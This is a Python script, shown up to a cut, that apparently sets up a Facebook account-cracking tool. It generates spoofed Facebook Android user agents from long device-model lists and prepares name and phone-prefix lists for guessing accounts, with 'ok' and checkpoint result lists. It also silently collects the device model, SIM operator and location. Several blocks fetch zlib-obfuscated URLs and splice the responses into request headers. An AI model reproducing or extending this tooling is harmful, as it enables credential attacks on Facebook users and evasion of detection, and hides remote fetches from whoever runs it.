import os
import uuid,base64,hashlib,zlib,subprocess,time,platform,pycurl,requests
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib,marshal
from bs4 import BeautifulSoup
from io import BytesIO
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
from concurrent.futures import ThreadPoolExecutor
try:
    import concurrent.futures
except ImportError:
    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install pycurl')
try: 
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install bs4')
    
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')
try:import httpx
except:os.system("pip install httpx")
import httpx
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize')
sys.stdout.write("\x1b]2; ZER0-XD\x07")
#━━━━[ COLORS ]━━━━#
###----------[ PEH ]----------##
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m";faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;46m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' 
G = '{GREEN}' 
Y = '\033[1;33m' 
Q = '\033[1;37m'
T = '\033[1;34m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
my_color = [
 P, M, H, K, B, U, N, R, Y,]
###----------[ CONVERT LINE ]----------###
led = f'{M} -{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}{M}-{M}-{M}-{H}-{M}'
###----------[ BANNER MENUH ]----------###
gen=f' {K}[{GREEN}√{K}] {P}'
dot=f' {K}[{GREEN}•{K}] {P}'
rdd=f' {K}[{RED}•{K}] {P}'
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
rong=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong2=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong3=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong4=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong5=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong6=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong7=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
fst=f'{dot}[{H}sumon{M}-{H}milon{M}-{H}bithika{M}-{H}sakshi{M}-{H}mimi{P}]'
lst=f'{dot}[{H}roy{M}-{H}sarkar{M}-{H}biswas{M}-{H}das{M}-{H}khan{P}]'
limitt=f'{dot}[{H}5000{M}-{H}10000{M}-{H}15000{M}-{H}20000{M}-{H}50000{P}]'
c7=f'{dot}[{H}7679{M}-{H}9832{M}-{H}6297{M}-{H}9987{M}-{H}8817{M}-{H}7209{P}]'
c6=f'{dot}[{H}01778{M}-{H}01991{M}-{H}01661{M}-{H}01776{M}-{H}01996{M}-{H}01779{P}]'
c8=f'{dot}[{H}017{M}-{H}019{M}-{H}016{M}-{H}013{M}-{H}018{M}-{H}014{M}-{H}015{P}]'
mtd,cp_xdx,cokix=[],[],[]
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
puti = '\033[1;37m'
loop = 0
oks = []
cps = []
id = []
ck = []
loop,ok,cp,user = 0,[],[],[]
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except :exit()
bulan = sasi[xx]
tahun = now.year
os.system('')
today = '\033[1;32m'+str(hari)+'\033[1;97m-\033[1;32m'+str(bulan)+'\033[1;97m-\033[1;32m'+str(tahun)

def get_current_location():
    try:
        response = requests.get('https://ipinfo.io/json')
        response.raise_for_status()  # Raise an HTTPSTM for bad responses
        data = response.json()
        city = data.get('city', 'Unknown')
        country = data.get('country', 'Unknown')
        return city, country
    except requests.RequestException as e:
        print("STM fetching current location:", e)
        return None, None
# Example usage
current_city, current_country = get_current_location()
try:
        # Get the device manufacturer
        manufacturer_result = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True)
        manufacturer_name = manufacturer_result.stdout.strip()
        # Get the device model
        model_result = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True)
        model_name = model_result.stdout.strip()
except Exception as e:
        print("Error retrieving device information:", e)
simcard=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').splitlines()
#▬▭▬▭▬▭▬▭[PERMISSION OF SDCARD]▬▭▬▭▬▭▬▭#
def sexy():   
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H']  
    budi = ['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P','SM-G986U','SM-G981U','SM-G975U','SM-G981U','SM-G965F','SM-G970U1','SM-G965U','SM-G930T','SM-G930VL','SM-G950U','SM-G981U','SM-N975U','SM-G935U','SM-N960U','SM-G986U','SM-G930R4','SM-N960W','Xiaomi 10 Pro','2201123G','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501','OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V']  
    akagami1 = "[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307931;FBDM/{density=2.0,width=720,height=1369};FBLC/pt_BR;FBRV/281357705;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(samsung))+";FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    akagami2 = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278218861;FBCR/smartmobil.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(budi))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    akagami3 = "[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=3.0,width=1080,height=2043};FBLC/cs_CZ;FBRV/290555739;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/"+str(random.choice(redmi))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    akagami4 = "[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342877;FBDM/{density=2.0,width=720,height=1424};FBLC/pl_PL;FBRV/268803887;FBCR/T-Mobile.pl;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+str(random.choice(oppo))+";FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    akagami5 = "[FBAN/FB4A;FBAV/370.0.0.23.112;FBBV/374931191;FBDM/{density=3.0,width=1080,height=2153};FBLC/en_US;FBRV/0;FBCR/LV TELE2;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/"+str(random.choice(infinix))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    user = random.choice([akagami1,akagami2,akagami3,akagami4,akagami5])
    trt = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + user
    return trt  
def generate_advanced_user_agent():
    facebook_version = f"{random.randint(100, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbbv = str(random.randint(10000000, 66666666))
    fbrv = str(random.randint(0, 999999999))
    density = random.choice(['2.0', '2.5', '3.0'])
    width = random.choice(["720", "1080", "1280", "1440", "1920", "2160"])
    height = random.choice(["720", "1080", "1280", "1440", "1920", "2560"])
    ver = random.choice(["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4.4.2", "5.1.1", "6.0.1", "9.0.1"]) 
    manufacturers = ['Samsung', 'Motorola', 'Huawei', 'Xiaomi', 'Asus', 'LG', 'Google', 'Sony', 'OnePlus']
    manufacturer = random.choice(manufacturers)
    models = {
        'Samsung': ['SM-G920F', 'SM-J701F', 'SM-T561', 'SM-G930F', 'SM-G950F', 'SM-G970U', 'SM-N960U'],
        'Motorola': ['Moto G', 'Moto X', 'Moto E', 'Moto G14', 'Moto G Stylus'],
        'Huawei': ['MatePad Pro 11', 'nova 11 SE', 'Mate 60 Pro+', 'Huawei Mate 20 Pro', 'Huawei P30 Lite'],
        'Xiaomi': ['Mi 10', 'Redmi Note 9', 'Mi A3', 'Mi 11 Ultra'],
        'Asus': ['ZenFone 7', 'ROG Phone 5', 'ZenPad Z8'],
        'LG': ['V60 ThinQ', 'G8X ThinQ', 'K40', 'Stylo 6'],
        'Google': ['Pixel 6', 'Pixel 5', 'Pixel 4a'],
        'Sony': ['Xperia 1', 'Xperia 10', 'Xperia L4'],
        'OnePlus': ['OnePlus 9', 'OnePlus 8T', 'OnePlus Nord']
    }
    model = random.choice(models[manufacturer])
    network_type = random.choice(['WiFi', 'LTE', '3G', '5G', 'HSPA+', '4G'])
    language_code = random.choice(['en_US', 'en_GB', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'pt_BR', 'ru_RU', 'zh_CN'])
    hardware = random.choice(['arm64-v8a', 'armeabi-v7a', 'x86_64'])
    android_build_fingerprint = (
        f"{manufacturer}/{model}/{model}:"
        f"{ver}/{random.choice(['QKQ1', 'RKQ1', 'TP1A', 'RP1A'])}/{random.randint(100000, 999999)}:user/release-keys"
    )
    ua = (
        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/{language_code};FBRV/{fbrv};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};"
        f"FBPN/com.facebook.katana;FBDV/{model};FBSV/{ver};FBOP/1;FBCA/{hardware};FBDK/{android_build_fingerprint}]"
    )
    
    return ua
#--------------------------------[METHOD 1]--------------------------------#
_method_1_buffer = BytesIO()
_method_1_curl = pycurl.Curl()
_method_1_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\x03\x12%\x19\xf9%\x86 \x01\x00\xab\x86\x19\xd8'))
_method_1_curl.setopt(pycurl.WRITEDATA, _method_1_buffer)
_method_1_curl.perform()
_method_1_data = _method_1_buffer.getvalue().decode('utf-8').splitlines()
def mls1():
    END = ''.join(_method_1_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 2]--------------------------------#
_method_2_buffer = BytesIO()
_method_2_curl = pycurl.Curl()
_method_2_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\x03\x12%\x19\xf9%F \x01\x00\xab\x8b\x19\xd9'))
_method_2_curl.setopt(pycurl.WRITEDATA, _method_2_buffer)
_method_2_curl.perform()
_method_2_data = _method_2_buffer.getvalue().decode('utf-8').splitlines()
def mls2():
    END = ''.join(_method_2_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 3]--------------------------------#
_method_3_buffer = BytesIO()
_method_3_curl = pycurl.Curl()
_method_3_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x06\t\x00\x00\xaa0\x19\xba'))
_method_3_curl.setopt(pycurl.WRITEDATA, _method_3_buffer)
_method_3_curl.perform()
_method_3_data = _method_3_buffer.getvalue().decode('utf-8').splitlines()
def mls3():
    END = ''.join(_method_3_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 4]--------------------------------#
_method_4_buffer = BytesIO()
_method_4_curl = pycurl.Curl()
_method_4_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x01\t\x00\x00\xaa5\x19\xbb'))
_method_4_curl.setopt(pycurl.WRITEDATA, _method_4_buffer)
_method_4_curl.perform()
_method_4_data = _method_4_buffer.getvalue().decode('utf-8').splitlines()
def mls4():
    END = ''.join(_method_4_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 5]--------------------------------#
_method_5_buffer = BytesIO()
_method_5_curl = pycurl.Curl()
_method_5_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x05\t\x00\x00\xaa:\x19\xbc'))
_method_5_curl.setopt(pycurl.WRITEDATA, _method_5_buffer)
_method_5_curl.perform()
_method_5_data = _method_5_buffer.getvalue().decode('utf-8').splitlines()
def mls5():
    END = ''.join(_method_5_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 6]--------------------------------#
_method_6_buffer = BytesIO()
_method_6_curl = pycurl.Curl()
_method_6_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x03\t\x00\x00\xaa?\x19\xbd'))
_method_6_curl.setopt(pycurl.WRITEDATA, _method_6_buffer)
_method_6_curl.perform()
